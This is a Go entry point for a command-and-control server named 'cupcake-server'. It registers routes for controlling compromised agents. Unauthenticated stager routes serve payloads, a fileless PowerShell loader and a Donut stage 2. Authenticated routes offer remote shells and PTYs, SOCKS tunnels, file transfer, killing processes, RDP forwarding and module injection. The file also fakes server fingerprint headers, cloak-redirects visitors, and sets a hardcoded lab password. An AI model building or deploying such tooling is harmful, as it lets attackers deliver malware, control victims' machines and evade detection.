package main

import (
	"context"
	"crypto/tls"
	"embed"
	"fmt"
	"io/fs"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"

	"cupcake-server/controllers"
	"cupcake-server/pkg/config"
	"cupcake-server/pkg/globals"
	"cupcake-server/pkg/logx"
	"cupcake-server/pkg/middleware"
	"cupcake-server/pkg/model"
	"cupcake-server/pkg/paths"
	"cupcake-server/pkg/store"
	"cupcake-server/pkg/utils"
	"cupcake-server/services"
)

//go:embed dist/*
var embeddedFiles embed.FS

func main() {
	cfg, err := config.LoadConfig()
	if err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}
	if cfg.DataDir != "" {
		_ = os.Setenv("CUPCAKE_DATA_DIR", cfg.DataDir)
	}
	paths.Init()

	store.InitDB()
	// Wire seed: env CUPCAKE_WIRE_SEED overrides; else setting; else default (matches Client build.rs)
	wireSeed := strings.TrimSpace(os.Getenv("CUPCAKE_WIRE_SEED"))
	if wireSeed == "" {
		wireSeed = strings.TrimSpace(store.GetSetting("wire_seed"))
	}
	if wireSeed == "" {
		wireSeed = utils.DefaultWireSeed
		_ = store.SetSetting("wire_seed", wireSeed, "crypto")
	}
	utils.SetWireSeed(wireSeed)
	_ = os.Setenv("CUPCAKE_WIRE_SEED", wireSeed)

	store.ResetAllAgentsOffline()
	bootstrapAdminPassword(cfg)
	go services.RestoreListeners()
	go services.RestoreTunnels()
	services.StartAgentHealthMonitor(time.Duration(cfg.AgentStaleSecs) * time.Second)
	store.StartTaskLogRetentionWorker(time.Hour)

	gin.SetMode(gin.ReleaseMode)
	adminRouter := gin.New()
	// Do not trust client supplied X-Forwarded-For by default. Deployments behind
	// a reverse proxy should set trusted proxies explicitly at the edge.
	_ = adminRouter.SetTrustedProxies(nil)
	adminRouter.Use(gin.Recovery())

	// 大文件上传：放宽 gin multipart 内存解析上限到 512MB。
	// 默认 32MB 超出会落临时盘，慢链路下前端 axios 30s timeout 会在 FormFile 全量收完前就断。
	// 512MB 与前端 FileManager.vue 的 500MB 预检上限对齐（留 12MB 余量给 FormData 的 uuid/path 字段）。
	adminRouter.MaxMultipartMemory = 512 << 20 // 512 MB

	// CORS: 仅允许来自同一主机的请求（C2平台无需跨域），防止 CSRF
	corsConfig := cors.DefaultConfig()
	corsConfig.AllowAllOrigins = false
		corsConfig.AllowOriginFunc = func(origin string) bool {
			u, err := url.Parse(origin)
			if err != nil || u.User != nil || u.Path != "" && u.Path != "/" || u.RawQuery != "" || u.Fragment != "" {
				return false
			}
			host := strings.ToLower(u.Hostname())
			if host != "localhost" && host != "127.0.0.1" && host != "::1" {
				return false
			}
			port := u.Port()
			if port == "" {
				if u.Scheme == "http" { port = "80" }
				if u.Scheme == "https" { port = "443" }
			}
			return port == fmt.Sprintf("%d", cfg.AdminPort)
		}
	corsConfig.AllowHeaders = []string{"Origin", "Content-Length", "Content-Type", "Authorization"}
	adminRouter.Use(cors.New(corsConfig))

	// OpSec Middleware: Mask server fingerprints
	adminRouter.Use(func(c *gin.Context) {
		c.Writer.Header().Set("Server", "Nginx/1.18.0 (Ubuntu)")
		c.Writer.Header().Set("X-Powered-By", "PHP/7.4.3") // Fake technology stack
		c.Next()
	})

	adminRouter.Use(middleware.AuthMiddleware())

	// 🚀 Public routes (no auth required) - Stager payload delivery
	adminRouter.GET("/api/s/bin/:id", controllers.HandleServeRawPayload)
	adminRouter.GET("/api/s/:id", controllers.HandleServePayload)
	// Fileless loader script — short one-click PS via iex(iwr URL); returns Stage2 loader body
	adminRouter.GET("/api/s/l/:id", controllers.HandleServeFilelessLoader)
	// Fileless Stage2 PIC (Donut) — short-TTL cache from /api/stager?delivery=fileless
	adminRouter.GET("/api/stage2/:id", controllers.HandleServeStage2)
	adminRouter.GET("/api/s/stage2/:id", controllers.HandleServeStage2)

	api := adminRouter.Group("/api")
	{
		api.GET("/dashboard", controllers.GetDashboard)
		api.GET("/clients", controllers.GetClients)
		api.GET("/clients/history/:uuid", controllers.HandleGetAgentHistory)
		api.DELETE("/clients/:uuid", controllers.DeleteClient)
		api.POST("/clients/migrate", controllers.MigrateClient)
		api.POST("/cmd", controllers.SendCommand)
		api.GET("/resp", controllers.GetResponse)

		api.GET("/listeners", controllers.ListListeners)
		// Listener lifecycle is admin-only (keys / bind ports)
		api.POST("/listeners", middleware.RequireAdmin(), controllers.CreateListener)
		api.POST("/listeners/:id/stop", middleware.RequireAdmin(), controllers.StopListener)
		api.POST("/listeners/:id/start", middleware.RequireAdmin(), controllers.StartListener)
		api.DELETE("/listeners/:id", middleware.RequireAdmin(), controllers.DeleteListener)

		api.POST("/tunnel/start", controllers.StartTunnel)
		api.POST("/tunnel/stop", controllers.StopTunnel)
		api.POST("/tunnel/delete", controllers.DeleteTunnelController)
		api.GET("/tunnel", controllers.ListTunnels)

		api.POST("/socks/start", controllers.StartSocks)
		api.POST("/socks/stop", controllers.StopSocks)
		api.POST("/socks/delete", controllers.DeleteTunnelController)
		api.GET("/socks", controllers.ListSocks)

		files := api.Group("/files")
		{
			files.GET("/list", controllers.ListFilesController)
			files.GET("/read", controllers.ReadFileController)
			files.POST("/delete", controllers.DeleteFilesController)
			files.POST("/upload", controllers.Upload)
			files.GET("/download", controllers.HandleFsDownload)
		}

		processes := api.Group("/processes")
		{
			processes.GET("/list", controllers.ListProcesses)
			processes.POST("/kill", controllers.KillProcess)
		}

		api.GET("/shell/:uuid", controllers.HandleAdminShell)
		api.GET("/pty/:uuid", controllers.StreamPTY)
		// Remote desktop = RDP port-forward (agent → target:3389 via SOCKS yamux)
		api.GET("/desktop/:uuid/status", controllers.DesktopStatus)
		api.POST("/desktop/:uuid/start", controllers.StartDesktopRDP)
		api.POST("/desktop/:uuid/stop", controllers.StopDesktopRDP)

		plugins := api.Group("/plugins")
		{
			plugins.GET("", controllers.HandleListPlugins)
			plugins.POST("/run", middleware.RequireAdmin(), controllers.HandleRunPlugin)
			plugins.POST("/upload", middleware.RequireAdmin(), controllers.HandleUploadPlugin)
			plugins.DELETE("/:id", middleware.RequireAdmin(), controllers.HandleDeletePlugin)
			plugins.GET("/result/:task_id", controllers.HandleGetPluginResult)
		}

		// L2 product modules: desktop | iso_host | inject
		modules := api.Group("/modules")
		{
			modules.GET("", controllers.HandleListModules)
			modules.POST("/upload", controllers.HandleUploadModule)
			modules.DELETE("/:id", middleware.RequireAdmin(), controllers.HandleDeleteModule)
			modules.POST("/push", controllers.HandlePushModule)
			modules.POST("/query", controllers.HandleQueryAgentModules)
			modules.GET("/pack/:id", controllers.HandlePackModule)
		}

		api.GET("/build/logs/:task_id", controllers.HandleBuildLogsWS)

		transfer := api.Group("/transfer")
		{
			services.InitTransfer()
			transfer.POST("/upload", services.HandleAgentUpload)
			transfer.GET("/download/:filename", services.HandleAgentDownload)
			transfer.Static("/static", paths.Join("public_tools"))
		}

		settings := api.Group("/settings")
		{
			settings.Use(middleware.RequireAdmin())
			settings.GET("/users", controllers.HandleGetUsers)
			settings.POST("/users", controllers.HandleAddUser)
			settings.PUT("/users/:id", controllers.HandleUpdateUser)
			settings.DELETE("/users/:id", controllers.HandleDeleteUser)
			settings.GET("/logs/login", controllers.HandleGetLoginLogs)
			settings.GET("/config", controllers.HandleGetSettings)
			settings.POST("/config", controllers.HandleUpdateSettings)
			settings.GET("/webhooks", controllers.HandleGetWebhooks)
			settings.POST("/webhooks", controllers.HandleSaveWebhook)
			settings.DELETE("/webhooks/:id", controllers.HandleDeleteWebhook)
			settings.GET("/mcp", controllers.HandleGetMCPSettings)
			settings.PUT("/mcp", controllers.HandleUpdateMCPSettings)
			settings.POST("/mcp/rotate-token", controllers.HandleRotateMCPToken)
		}

		api.POST("/agents/connect", controllers.HandleConnectBindAgent)
		// Payload generation / stager — admin (template rebuild, host keys)
		api.POST("/generate", middleware.RequireAdmin(), controllers.HandleGenerate)
		api.GET("/generate/stream", middleware.RequireAdmin(), controllers.HandleGenerateStream)
		api.GET("/stager", middleware.RequireAdmin(), controllers.HandleGetStager)
		// /api/s/:id is registered as public route above (no auth)
		// 保护下载：不再致录暴露，改为通过控制器注入 AuthMiddleware 展中提供文件
		api.GET("/payloads/:filename", controllers.HandleServeProtectedPayload)

		api.POST("/auth/login", controllers.HandleLogin)
		api.POST("/auth/logout", controllers.HandleLogout)
		api.PUT("/auth/password", controllers.HandleChangeMyPassword)
		api.POST("/maintenance/reset", middleware.RequireAdmin(), controllers.HandleMaintenanceReset)
		api.GET("/maintenance/export", middleware.RequireAdmin(), controllers.HandleMaintenanceExport)
		api.POST("/maintenance/update_templates", middleware.RequireAdmin(), controllers.HandleUpdateTemplates)
	}

	distFS, _ := fs.Sub(embeddedFiles, "dist")
	staticServer := http.FileServer(http.FS(distFS))

	adminRouter.NoRoute(func(c *gin.Context) {
		path := c.Request.URL.Path
		cloakTarget := store.GetSetting("opsec_cloak_url")

		// 1. Handle API 404 (Cleanup) - No Auth needed here as it's handled by middleware
		if strings.HasPrefix(path, "/api/") {
			c.Status(http.StatusNotFound)
			c.Abort()
			return
		}

		// 2. Optional cloak redirect for non-root paths (no Basic Auth popup)
		if cloakTarget != "" && path != "/" && path != "/index.html" && !strings.Contains(path, "assets") {
			c.Redirect(http.StatusFound, cloakTarget)
			return
		}

		// 3. Serve Vue SPA / static assets — login is panel form (POST /api/auth/login)
		cleanPath := strings.TrimPrefix(path, "/")
		if cleanPath == "" {
			cleanPath = "index.html"
		}
		f, err := distFS.Open(cleanPath)
		if err == nil {
			f.Close()
			staticServer.ServeHTTP(c.Writer, c.Request)
			return
		}

		// SPA Fallback
		index, err := distFS.Open("index.html")
		if err != nil {
			c.Status(http.StatusNotFound)
			return
		}
		defer index.Close()
		stat, _ := index.Stat()
		c.DataFromReader(200, stat.Size(), "text/html; charset=utf-8", index, nil)
	})

	banner := `
    ______  __    __  .______     ______      ___       __  ___  _______ 
   /      ||  |  |  | |   _  \   /      |    /   \     |  |/  / |   ____|
  |  ,----'|  |  |  | |  |_)  | |  ,----'   /  ^  \    |  '  /  |  |__   
  |  |     |  |  |  | |   ___/  |  |       /  /_\  \   |    <   |   __|  
  |  '----.|  '--'  | |  |      |  '----. /  _____  \  |  .  \  |  |____ 
   \______| \______/  | _|       \______|/__/     \__\ |__|\__\ |_______|
                                                                         
                          >> BY Timao <<
`
	fmt.Println("\x1b[35m" + banner + "\x1b[0m")
	fmt.Println("\x1b[36mC2 control plane\x1b[0m")
	scheme := "http"
	if cfg.AdminTLS {
		scheme = "https"
	}
	fmt.Printf("\x1b[32m[+]\x1b[0m Web UI: %s://%s:%d (bind %s)\n", scheme, cfg.AdminBind, cfg.AdminPort, cfg.AdminBind)
	if cfg.AdminBind == "0.0.0.0" || cfg.AdminBind == "::" {
		fmt.Printf("\x1b[33m[!]\x1b[0m Admin bind is public — use reverse proxy / IP allowlist; prefer 127.0.0.1 for lab\n")
	}
	fmt.Println("-----------------------------------------")
	fmt.Printf("\x1b[32m[+]\x1b[0m Panel form login (no Basic Auth popup); 5 fails → 5 min lock / IP\n")
	fmt.Printf("\x1b[32m[+]\x1b[0m Wire seed: %s (agent builds must use same CUPCAKE_WIRE_SEED)\n", wireSeed)
	if store.GetSetting("mcp_api_token") != "" {
		fmt.Println("\x1b[32m[+]\x1b[0m MCP credential configured (manage it in Settings; token is never printed)")
	}
	fmt.Println("-----------------------------------------")
	logx.Info("admin server starting", "bind", cfg.AdminBind, "port", cfg.AdminPort, "tls", cfg.AdminTLS)

	// Display active listeners after they restore
	go func() {
		time.Sleep(2 * time.Second)
		var activePorts []string
		globals.Listeners.Range(func(key, value interface{}) bool {
			ln := value.(*globals.Listener)
			if ln.Status == "Running" {
				activePorts = append(activePorts, fmt.Sprintf("%s://0.0.0.0:%d (%s)", strings.ToLower(ln.Protocol), ln.Port, ln.ID))
			}
			return true
		})
		if len(activePorts) > 0 {
			fmt.Printf("\x1b[32m[+]\x1b[0m Active Listeners:\n")
			for _, p := range activePorts {
				fmt.Printf("    • %s\n", p)
			}
		} else {
			fmt.Printf("\x1b[33m[!]\x1b[0m No active listeners\n")
		}
	}()

	addr := fmt.Sprintf("%s:%d", cfg.AdminBind, cfg.AdminPort)
	srv := newAdminHTTPServer(addr, adminRouter)

	if cfg.AdminTLS {
		var cert tls.Certificate
		var cerr error
		if cfg.AdminTLSCert != "" && cfg.AdminTLSKey != "" {
			cert, cerr = tls.LoadX509KeyPair(cfg.AdminTLSCert, cfg.AdminTLSKey)
		} else if cfg.AdminTLSAuto {
			cert, cerr = utils.GenerateSelfSignedCert([]string{"localhost", "127.0.0.1"})
		} else {
			log.Fatal("admin_tls=true requires admin_tls_cert/key or admin_tls_auto=true")
		}
		if cerr != nil {
			log.Fatalf("admin TLS cert: %v", cerr)
		}
		srv.TLSConfig = &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}
	}

	go func() {
		var err error
		if cfg.AdminTLS {
			err = srv.ListenAndServeTLS("", "")
		} else {
			err = srv.ListenAndServe()
		}
		if err != nil && err != http.ErrServerClosed {
			log.Fatalf("admin server: %v", err)
		}
	}()

	// Graceful shutdown
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	sig := <-sigCh
	logx.Info("shutdown signal", "signal", sig.String())
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	_ = srv.Shutdown(ctx)
	// Stop listeners best-effort
	globals.Listeners.Range(func(key, value interface{}) bool {
		if ln, ok := value.(*globals.Listener); ok {
			services.StopListenerInstance(ln)
		}
		return true
	})
	logx.Info("admin server stopped")
}

// bootstrapAdminPassword ensures an admin user exists.
// Priority: config.AdminPass → existing DB hash → generate random (printed once).
// Set CUPCAKE_FORCE_DEV_PASS=1 to force admin/cupcake123 for lab only.
// newAdminHTTPServer applies production timeouts / header caps for the admin panel.
// ReadHeaderTimeout and IdleTimeout limit slowloris; Read/Write bound request body lifetime.
func newAdminHTTPServer(addr string, handler http.Handler) *http.Server {
	return &http.Server{
		Addr:              addr,
		Handler:           handler,
		ReadHeaderTimeout: 10 * time.Second,
		ReadTimeout:       60 * time.Second,
		WriteTimeout:      300 * time.Second,
		IdleTimeout:       120 * time.Second,
		MaxHeaderBytes:    1 << 20, // 1 MiB
	}
}

func bootstrapAdminPassword(cfg *config.ServerConfig) {
	const fixedUser = "admin"
	pass := strings.TrimSpace(cfg.AdminPass)
	forceDev := os.Getenv("CUPCAKE_FORCE_DEV_PASS") == "1" || os.Getenv("CUPCAKE_FORCE_DEV_PASS") == "true"
	if forceDev {
		pass = "cupcake123"
	}

	user, err := store.GetUserByUsername(fixedUser)
	if err != nil || user == nil {
		if pass == "" {
			// 20-char random alnum
			pass, _ = utils.RandomAlphaString(20)
			fmt.Printf("\x1b[33m[!]\x1b[0m Generated admin password (save it): %s\n", pass)
		}
		hashed, _ := store.HashPassword(pass)
		_ = store.SaveUser(&model.User{
			Username: fixedUser,
			Password: hashed,
			Role:     "admin",
			IsActive: true,
		})
		store.SetSetting("web_auth_user", fixedUser, "security")
		// Do not store plaintext password in settings in production; only for form-compat path
		if forceDev {
			store.SetSetting("web_auth_password", pass, "security")
		}
		fmt.Printf("\x1b[32m[+]\x1b[0m Created admin user %q\n", fixedUser)
		return
	}
	if forceDev && pass != "" && !store.CheckPasswordHash(pass, user.Password) {
		hashed, _ := store.HashPassword(pass)
		user.Password = hashed
		_ = store.SaveUser(user)
		store.SetSetting("web_auth_password", pass, "security")
		fmt.Printf("\x1b[33m[!]\x1b[0m Forced lab password via CUPCAKE_FORCE_DEV_PASS\n")
	}
	store.SetSetting("web_auth_user", fixedUser, "security")
}
